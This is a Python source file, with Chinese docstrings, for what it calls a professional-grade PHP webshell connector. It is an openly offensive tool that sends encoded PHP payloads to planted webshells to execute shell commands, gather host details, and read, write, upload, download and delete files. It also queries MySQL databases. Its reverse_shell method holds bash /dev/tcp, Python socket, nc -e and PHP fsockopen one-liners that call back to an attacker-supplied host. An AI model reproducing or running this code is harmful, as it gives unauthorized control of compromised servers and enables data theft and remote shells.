"""
PHP Webshell连接器模块
基于20年渗透测试经验的专业级PHP Webshell连接器
支持命令执行、文件操作、数据库操作、反弹Shell等功能
"""

import httpx
import base64
import logging
import hashlib
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from datetime import datetime
import urllib.parse

logger = logging.getLogger(__name__)


@dataclass
class WebshellConnection:
    """Webshell连接信息"""
    id: str
    url: str
    password: str
    method: str = 'POST'  # POST, GET, COOKIE, HEADER
    encoding: str = 'base64'  # base64, hex, rot13
    status: str = 'unknown'
    last_connect: Optional[datetime] = None
    os_type: Optional[str] = None
    web_server: Optional[str] = None
    php_version: Optional[str] = None
    current_user: Optional[str] = None
    current_dir: Optional[str] = None
    tags: List[str] = None
    
    def __post_init__(self):
        if self.tags is None:
            self.tags = []


@dataclass
class CommandResult:
    """命令执行结果"""
    success: bool
    output: str
    error: Optional[str] = None
    exit_code: Optional[int] = None
    elapsed: float = 0.0


@dataclass
class FileInfo:
    """文件信息"""
    name: str
    path: str
    size: int
    is_dir: bool
    permissions: str
    owner: str
    group: str
    modify_time: str
    mime_type: str


class PHPConnector:
    """专业级PHP Webshell连接器"""
    
    def __init__(self):
        self.connections: Dict[str, WebshellConnection] = {}
        self.timeout: int = 30
        self.verify_ssl: bool = False
        self.follow_redirects: bool = True
        
        logger.info("专业级PHP Webshell连接器初始化完成")
    
    def add_connection(self, url: str, password: str, method: str = 'POST', encoding: str = 'base64') -> str:
        """添加Webshell连接"""
        import uuid
        conn_id = str(uuid.uuid4())
        
        connection = WebshellConnection(
            id=conn_id,
            url=url,
            password=password,
            method=method,
            encoding=encoding,
            status='unknown'
        )
        
        self.connections[conn_id] = connection
        logger.info(f"添加Webshell连接: {url}")
        return conn_id
    
    async def test_connection(self, conn_id: str) -> Tuple[bool, str]:
        """测试连接"""
        if conn_id not in self.connections:
            return False, "连接不存在"
        
        conn = self.connections[conn_id]
        
        try:
            test_cmd = 'echo "CONN_OK_' + hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:8] + '"'
            result = await self.execute_command(conn_id, test_cmd)
            
            if result.success and 'CONN_OK_' in result.output:
                await self._gather_system_info(conn_id)
                conn.status = 'online'
                conn.last_connect = datetime.now()
                logger.info(f"连接测试成功: {conn.url}")
                return True, "连接成功"
            else:
                conn.status = 'offline'
                return False, "连接失败"
                
        except Exception as e:
            conn.status = 'offline'
            logger.error(f"连接测试失败: {e}")
            return False, str(e)
    
    async def _gather_system_info(self, conn_id: str):
        """收集系统信息"""
        conn = self.connections[conn_id]
        
        try:
            os_result = await self.execute_command(conn_id, 'php_uname()')
            if os_result.success:
                conn.os_type = os_result.output.strip()
            
            user_result = await self.execute_command(conn_id, 'get_current_user()')
            if user_result.success:
                conn.current_user = user_result.output.strip()
            
            dir_result = await self.execute_command(conn_id, 'getcwd()')
            if dir_result.success:
                conn.current_dir = dir_result.output.strip()
            
            version_result = await self.execute_command(conn_id, 'phpversion()')
            if version_result.success:
                conn.php_version = version_result.output.strip()
            
        except Exception as e:
            logger.error(f"收集系统信息失败: {e}")
    
    async def execute_command(self, conn_id: str, command: str, is_shell_cmd: bool = True) -> CommandResult:
        """执行命令"""
        if conn_id not in self.connections:
            return CommandResult(False, '', "连接不存在")
        
        conn = self.connections[conn_id]
        start_time = datetime.now().timestamp()
        
        try:
            if is_shell_cmd:
                php_code = self._generate_shell_exec_command(command)
            else:
                php_code = command
            
            response = await self._send_request(conn, php_code)
            
            output = self._decode_response(response, conn.encoding)
            elapsed = datetime.now().timestamp() - start_time
            
            return CommandResult(
                success=True,
                output=output,
                elapsed=elapsed
            )
            
        except Exception as e:
            elapsed = datetime.now().timestamp() - start_time
            return CommandResult(
                success=False,
                output='',
                error=str(e),
                elapsed=elapsed
            )
    
    def _generate_shell_exec_command(self, command: str) -> str:
        """生成shell执行命令"""
        exec_methods = [
            f'system("{command}");',
            f'exec("{command}");',
            f'shell_exec("{command}");',
            f'passthru("{command}");',
            f'popen("{command}", "r");'
        ]
        
        php_code = f'<?php '
        for method in exec_methods:
            php_code += f'if(function_exists("{method.split("(")[0]}")){{ $r = {method} echo $r; exit; }}'
        php_code += '?>'
        
        return php_code
    
    async def _send_request(self, conn: WebshellConnection, payload: str) -> str:
        """发送请求"""
        encoded_payload = self._encode_payload(payload, conn.encoding)
        
        async with httpx.AsyncClient(
            timeout=self.timeout,
            verify=self.verify_ssl,
            follow_redirects=self.follow_redirects
        ) as client:
            if conn.method == 'POST':
                response = await client.post(
                    conn.url,
                    data={conn.password: encoded_payload}
                )
            elif conn.method == 'GET':
                url = f"{conn.url}?{conn.password}={urllib.parse.quote(encoded_payload)}"
                response = await client.get(url)
            elif conn.method == 'COOKIE':
                response = await client.get(
                    conn.url,
                    cookies={conn.password: encoded_payload}
                )
            elif conn.method == 'HEADER':
                response = await client.get(
                    conn.url,
                    headers={conn.password: encoded_payload}
                )
            else:
                raise ValueError(f"不支持的方法: {conn.method}")
            
            return response.text
    
    def _encode_payload(self, payload: str, encoding: str) -> str:
        """编码载荷"""
        if encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding == 'hex':
            return payload.encode().hex()
        elif encoding == 'rot13':
            import codecs
            return codecs.encode(payload, 'rot_13')
        return payload
    
    def _decode_response(self, response: str, encoding: str) -> str:
        """解码响应"""
        try:
            if encoding == 'base64':
                try:
                    decoded = base64.b64decode(response.strip()).decode('utf-8', errors='ignore')
                    if decoded:
                        return decoded
                except:
                    pass
            elif encoding == 'hex':
                try:
                    decoded = bytes.fromhex(response.strip()).decode('utf-8', errors='ignore')
                    if decoded:
                        return decoded
                except:
                    pass
        except:
            pass
        return response
    
    async def list_directory(self, conn_id: str, path: str = '.') -> List[FileInfo]:
        """列出目录"""
        php_code = f'''<?php
$dir = "{path}";
if(is_dir($dir)) {{
    $files = scandir($dir);
    $result = [];
    foreach($files as $file) {{
        if($file != "." && $file != "..") {{
            $f = $dir . "/" . $file;
            $info = [
                "name" => $file,
                "path" => $f,
                "size" => filesize($f),
                "is_dir" => is_dir($f),
                "perms" => substr(sprintf("%o", fileperms($f)), -4),
                "owner" => posix_getpwuid(fileowner($f))["name"] ?? "",
                "group" => posix_getgrgid(filegroup($f))["name"] ?? "",
                "mtime" => date("Y-m-d H:i:s", filemtime($f)),
                "mime" => mime_content_type($f)
            ];
            $result[] = $info;
        }}
    }}
    echo json_encode($result);
}}
?>'''
        
        result = await self.execute_command(conn_id, php_code, is_shell_cmd=False)
        if not result.success:
            return []
        
        import json
        try:
            files_data = json.loads(result.output)
            file_list = []
            for f_data in files_data:
                file_list.append(FileInfo(
                    name=f_data.get('name', ''),
                    path=f_data.get('path', ''),
                    size=f_data.get('size', 0),
                    is_dir=f_data.get('is_dir', False),
                    permissions=f_data.get('perms', ''),
                    owner=f_data.get('owner', ''),
                    group=f_data.get('group', ''),
                    modify_time=f_data.get('mtime', ''),
                    mime_type=f_data.get('mime', '')
                ))
            return file_list
        except:
            return []
    
    async def read_file(self, conn_id: str, filepath: str) -> Optional[str]:
        """读取文件"""
        php_code = f'''<?php
echo file_get_contents("{filepath}");
?>'''
        
        result = await self.execute_command(conn_id, php_code, is_shell_cmd=False)
        return result.output if result.success else None
    
    async def write_file(self, conn_id: str, filepath: str, content: str) -> bool:
        """写入文件"""
        encoded_content = base64.b64encode(content.encode()).decode()
        php_code = f'''<?php
$content = base64_decode("{encoded_content}");
echo file_put_contents("{filepath}", $content) ? "OK" : "ERROR";
?>'''
        
        result = await self.execute_command(conn_id, php_code, is_shell_cmd=False)
        return result.success and 'OK' in result.output
    
    async def delete_file(self, conn_id: str, filepath: str) -> bool:
        """删除文件"""
        php_code = f'''<?php
echo unlink("{filepath}") ? "OK" : "ERROR";
?>'''
        
        result = await self.execute_command(conn_id, php_code, is_shell_cmd=False)
        return result.success and 'OK' in result.output
    
    async def upload_file(self, conn_id: str, local_path: str, remote_path: str) -> bool:
        """上传文件"""
        try:
            with open(local_path, 'rb') as f:
                content = f.read()
            
            encoded_content = base64.b64encode(content).decode()
            php_code = f'''<?php
$content = base64_decode("{encoded_content}");
echo file_put_contents("{remote_path}", $content) ? "OK" : "ERROR";
?>'''
            
            result = await self.execute_command(conn_id, php_code, is_shell_cmd=False)
            return result.success and 'OK' in result.output
            
        except Exception as e:
            logger.error(f"文件上传失败: {e}")
            return False
    
    async def download_file(self, conn_id: str, remote_path: str, local_path: str) -> bool:
        """下载文件"""
        try:
            content = await self.read_file(conn_id, remote_path)
            if content is None:
                return False
            
            with open(local_path, 'wb') as f:
                f.write(content.encode())
            
            return True
            
        except Exception as e:
            logger.error(f"文件下载失败: {e}")
            return False
    
    async def reverse_shell(self, conn_id: str, host: str, port: int, method: str = 'bash') -> bool:
        """反弹Shell"""
        shell_methods = {
            'bash': f'bash -c "bash -i >& /dev/tcp/{host}/{port} 0>&1"',
            'python': f'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")"',
            'nc': f'nc -e /bin/bash {host} {port}',
            'php': f'php -r "$sock=fsockopen(\"{host}\",{port});$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);"'
        }
        
        if method not in shell_methods:
            method = 'bash'
        
        cmd = shell_methods[method]
        result = await self.execute_command(conn_id, cmd)
        return result.success
    
    async def mysql_query(self, conn_id: str, host: str, user: str, password: str, database: str, query: str) -> Optional[List[Dict]]:
        """执行MySQL查询"""
        php_code = f'''<?php
$conn = mysqli_connect("{host}", "{user}", "{password}", "{database}");
if(!$conn) {{ echo json_encode(["error" => mysqli_connect_error()]); exit; }}
$result = mysqli_query($conn, "{query}");
if(!$result) {{ echo json_encode(["error" => mysqli_error($conn)]); exit; }}
$rows = [];
while($row = mysqli_fetch_assoc($result)) {{ $rows[] = $row; }}
echo json_encode($rows);
?>'''
        
        result = await self.execute_command(conn_id, php_code, is_shell_cmd=False)
        if not result.success:
            return None
        
        import json
        try:
            data = json.loads(result.output)
            if isinstance(data, list):
                return data
            elif isinstance(data, dict) and 'error' in data:
                logger.error(f"MySQL查询错误: {data['error']}")
                return None
            return None
        except:
            return None
    
    def get_connection(self, conn_id: str) -> Optional[WebshellConnection]:
        """获取连接"""
        return self.connections.get(conn_id)
    
    def get_all_connections(self) -> List[WebshellConnection]:
        """获取所有连接"""
        return list(self.connections.values())
    
    def remove_connection(self, conn_id: str) -> bool:
        """移除连接"""
        if conn_id in self.connections:
            del self.connections[conn_id]
            return True
        return False
    
    def tag_connection(self, conn_id: str, tag: str) -> bool:
        """添加标签"""
        if conn_id in self.connections:
            if tag not in self.connections[conn_id].tags:
                self.connections[conn_id].tags.append(tag)
            return True
        return False
